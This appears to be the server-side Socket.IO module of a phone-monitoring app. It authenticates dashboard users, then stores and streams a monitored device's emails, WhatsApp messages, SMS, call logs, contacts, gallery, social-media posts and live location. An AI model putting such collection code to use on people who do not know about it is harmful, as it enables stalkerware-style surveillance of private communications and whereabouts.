// Tambahkan di awal file
let ioInstance = null;

const setIO = (io) => {
  ioInstance = io;
};

const getIO = () => {
  return ioInstance;
};

const { verifyIdToken } = require('../config/firebase');
const {
  Email,
  WhatsApp,
  SocialMedia,
  Contact,
  SMS,
  Call,
  Location,
  Network,
  Device,
} = require('../models/MonitoringData.model');

const connectedClients = new Map();

const initializeSocket = (io) => {
  // Set IO instance
  setIO(io);
  
  io.use(async (socket, next) => {
    try {
      const token = socket.handshake.query.token;
      if (!token) {
        return next(new Error('Authentication required'));
      }
      
      const decodedToken = await verifyIdToken(token);
      if (!decodedToken) {
        return next(new Error('Invalid token'));
      }
      
      socket.userId = decodedToken.uid;
      next();
    } catch (error) {
      console.error('Socket auth error:', error);
      next(new Error('Authentication failed'));
    }
  });
  
  io.on('connection', (socket) => {
    const { userId } = socket;
    console.log(`🔌 Client connected: ${userId} (${socket.id})`);
    
    // Join user's room
    socket.join(userId);
    connectedClients.set(socket.id, userId);
    
    // Send initial data
    sendInitialData(socket, userId);
    
    // Handle client app data
    socket.on('client-data', async (data) => {
      await handleClientData(userId, data, io);
    });
    
    // Handle location updates
    socket.on('location-update', async (location) => {
      try {
        const locationData = await Location.create({
          userId,
          ...location,
          timestamp: new Date(),
        });
        io.to(userId).emit('location-update', locationData);
      } catch (error) {
        console.error('Location update error:', error);
      }
    });
    
    // Handle network updates
    socket.on('network-update', async (network) => {
      try {
        const networkData = await Network.create({
          userId,
          ...network,
          timestamp: new Date(),
        });
        io.to(userId).emit('network-update', networkData);
      } catch (error) {
        console.error('Network update error:', error);
      }
    });
    
    // Handle device updates
    socket.on('device-update', async (device) => {
      try {
        const deviceData = await Device.create({
          userId,
          ...device,
          timestamp: new Date(),
        });
        io.to(userId).emit('device-update', deviceData);
      } catch (error) {
        console.error('Device update error:', error);
      }
    });
    
    // Handle contact sync
    socket.on('contacts-sync', async (contacts) => {
      try {
        await Contact.deleteMany({ userId });
        const newContacts = await Contact.insertMany(
          contacts.map(contact => ({ ...contact, userId }))
        );
        io.to(userId).emit('contacts-update', newContacts);
      } catch (error) {
        console.error('Contacts sync error:', error);
      }
    });
    
    // Handle gallery request
    socket.on('request-gallery', async () => {
      try {
        const Gallery = require('../models/Gallery.model');
        const media = await Gallery.find({ userId }).sort({ createdAt: -1 });
        socket.emit('gallery-update', media);
      } catch (error) {
        console.error('Gallery request error:', error);
      }
    });
    
    // Handle alert acknowledgment
    socket.on('alert-ack', async (alertId) => {
      try {
        const Alert = require('../models/Alert.model');
        await Alert.findOneAndUpdate(
          { _id: alertId, userId },
          { isRead: true }
        );
      } catch (error) {
        console.error('Alert acknowledgment error:', error);
      }
    });
    
    // Handle ping/pong
    socket.on('ping', () => {
      socket.emit('pong');
    });
    
    // Handle disconnect
    socket.on('disconnect', () => {
      console.log(`🔌 Client disconnected: ${userId} (${socket.id})`);
      connectedClients.delete(socket.id);
    });
  });
};

const sendInitialData = async (socket, userId) => {
  try {
    const [emails, whatsapp, socialMedia, contacts, sms, calls, location, network, device] = await Promise.all([
      Email.find({ userId }).sort({ date: -1 }).limit(50),
      WhatsApp.find({ userId }).sort({ timestamp: -1 }).limit(100),
      SocialMedia.find({ userId }).sort({ date: -1 }).limit(50),
      Contact.find({ userId }).sort({ name: 1 }),
      SMS.find({ userId }).sort({ date: -1 }).limit(100),
      Call.find({ userId }).sort({ date: -1 }).limit(100),
      Location.findOne({ userId }).sort({ timestamp: -1 }),
      Network.findOne({ userId }).sort({ timestamp: -1 }),
      Device.findOne({ userId }).sort({ timestamp: -1 }),
    ]);
    
    socket.emit('monitoring-data', {
      emails,
      whatsapp,
      socialMedia,
      contacts,
      sms,
      calls,
      location,
      network,
      device,
    });
  } catch (error) {
    console.error('Send initial data error:', error);
  }
};

const handleClientData = async (userId, data, io) => {
  try {
    const updates = [];
    
    if (data.emails && data.emails.length) {
      const emails = await Email.insertMany(
        data.emails.map(email => ({ ...email, userId }))
      );
      updates.push(io.to(userId).emit('email-update', emails));
    }
    
    if (data.whatsapp && data.whatsapp.length) {
      const whatsapp = await WhatsApp.insertMany(
        data.whatsapp.map(msg => ({ ...msg, userId }))
      );
      updates.push(io.to(userId).emit('whatsapp-update', whatsapp));
    }
    
    if (data.socialMedia && data.socialMedia.length) {
      const socialMedia = await SocialMedia.insertMany(
        data.socialMedia.map(post => ({ ...post, userId }))
      );
      updates.push(io.to(userId).emit('social-media-update', socialMedia));
    }
    
    if (data.sms && data.sms.length) {
      const sms = await SMS.insertMany(
        data.sms.map(msg => ({ ...msg, userId }))
      );
      updates.push(io.to(userId).emit('sms-update', sms));
    }
    
    if (data.calls && data.calls.length) {
      const calls = await Call.insertMany(
        data.calls.map(call => ({ ...call, userId }))
      );
      updates.push(io.to(userId).emit('calls-update', calls));
    }
    
    await Promise.all(updates);
  } catch (error) {
    console.error('Handle client data error:', error);
  }
};

const getConnectedClients = () => {
  return Array.from(connectedClients.values());
};

const isUserConnected = (userId) => {
  return Array.from(connectedClients.values()).includes(userId);
};

const getClientCount = () => {
  return connectedClients.size;
};

// Export semua fungsi
module.exports = { 
  initializeSocket, 
  getConnectedClients,
  setIO,
  getIO,
  isUserConnected,
  getClientCount,
};
